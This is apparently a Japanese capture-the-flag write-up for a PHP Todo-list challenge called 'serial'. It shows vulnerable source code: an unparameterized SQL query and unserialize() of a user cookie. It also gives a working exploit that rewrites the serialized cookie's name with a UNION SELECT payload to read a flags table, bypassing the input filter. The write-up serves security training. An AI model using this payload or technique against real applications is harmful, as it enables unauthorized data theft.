# serial

Todoリストを作成するアプリ

SQL絡んでそうなdatabase.phpを見るとfindUserByNameがprepared statementを使っていないためSQLインジェクションできそうなことがわかる

```php
/**
 * findUserByName finds a user from database by given userId.
 *
 * @deprecated this function might be vulnerable to SQL injection. DO NOT USE THIS FUNCTION.
 */
public function findUserByName($user = null)
{
    if (!isset($user->name)) {
        throw new Exception('invalid user name: ' . $user->user);
    }

    $sql = "SELECT id, name, password_hash FROM users WHERE name = '" . $user->name . "' LIMIT 1";
    $result = $this->_con->query($sql);
    if (!$result) {
        throw new Exception('failed query for findUserByNameOld ' . $sql);
    }

    while ($row = $result->fetch_assoc()) {
        $user = new User($row['id'], $row['name'], $row['password_hash']);
    }
    return $user;
}
```

findUserByNameをどこで使っているのか見るとsignup.phpとuser.phpで使用されていることがわかる

signup.phpでは、user登録されたのちにfindUserByNameで実際に登録されているか確認している

```php
$name = $_POST['name'];
$pass = password_hash($_POST['pass'], PASSWORD_DEFAULT);
$user = new User(-1, $name, $pass);

try {
    $db = new Database();
    $db->insertUser($user);

    $user = $db->findUserByName($user);
    if (!$user->isValid()) {
        throw new Exception("invalid user: " . $user->__toString());
    }
} catch (Exception $e) {
    var_dump($e->getMessage());
}

setcookie("__CRED", base64_encode(serialize($user)));
```

そのため、userにSQL injectionを行えばinjectionできそうだったが、Userクラスでエスケープされてしまっていた

```php
public function __construct($id = null, $name = null, $password_hash = null)
{
    $this->id = htmlspecialchars($id);
    $this->name = htmlspecialchars(str_replace(self::invalid_keywords, "?", $name));
    $this->password_hash = $password_hash;
}
```

しかし、見返すとsignup.phpの最後にて`setcookie("__CRED", base64_encode(serialize($user)));`userをシリアライズしてbase64エンコードしたものをcookieに保存していることがわかった。

また、ログインにも用いられており、

1. cookieに保存されている情報をデシリアライズ
2. デシリアライズしたものをfindUserByNameを用いてuserが登録されているか確認
3. cookieに保存されていたものとfindUserByNameで返ってきたuserのpasswordが一致していればcookieにfindUserByNameで返ってきたuserをシリアライズ、エンコードし保存

という流れになっている。

```php
function login()
{
    if (empty($_COOKIE["__CRED"])) {
        return false;
    }

    $user = unserialize(base64_decode($_COOKIE['__CRED']));

    // check if the given user exists
    try {
        $db = new Database();
        $storedUser = $db->findUserByName($user);
    } catch (Exception $e) {
        die($e->getMessage());
    }
    // var_dump($user);
    // var_dump($storedUser);
    if ($user->password_hash === $storedUser->password_hash) {
        // update stored user with latest information
        // die($storedUser);
        setcookie("__CRED", base64_encode(serialize($storedUser)));
        return true;
    }
    return false;
}
```

cookieに保存されているものは書き換えることができるので、cookie情報を上書きしてしまえばSQL injectionができてしまえそうだと推測。

よって、まずは適当なuser名とpasswordでログイン

その後、cookie情報を手元でデコード、デシリアライズし、nameを上書きする。

具体的には以下のコードを用いた

```php
class User
{
    private const invalid_keywords = array("UNION", "'", "FROM", "SELECT", "flag");

    public $id;
    public $name;
    public $password_hash;

    public function __construct($id = null, $name = null, $password_hash = null)
    {
        $this->id = htmlspecialchars($id);
        $this->name = htmlspecialchars(str_replace(self::invalid_keywords, "?", $name));
        $this->password_hash = $password_hash;
    }

    public function __toString()
    {
        return "id: " . $this->id . ", name: " . $this->name . ", pass: " . $this->password_hash;
    }

    public function isValid()
    {
        return isset($this->id) && isset($this->name) && isset($this->password_hash);
    }
}
$a = "Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjQ6IjEyMTkiO3M6NDoibmFtZSI7czo4OiJob2dlaG9nZSI7czoxMzoicGFzc3dvcmRfaGFzaCI7czo2MDoiJDJ5JDEwJE90Z3pDQmVQcVFCMU5GTXFFUmI1V3VMNXNoaWg2am9PL21KZ0Z2aE1TVVdPR3BjNzJ5NlI2Ijt9";
$a_obj  = unserialize(base64_decode($a));
$a_obj->name = "' union select 1, body, concat('\$2y\$10\$OtgzCBePqQB1NFMqERb5WuL5shih6joO/mJgFvhMSUWOGpc72y6R6') from flags #";
print(serialize($a_obj));
```

cookieを上書きして更新したのち、再度cookieをデコードするとflagが書き込まれている
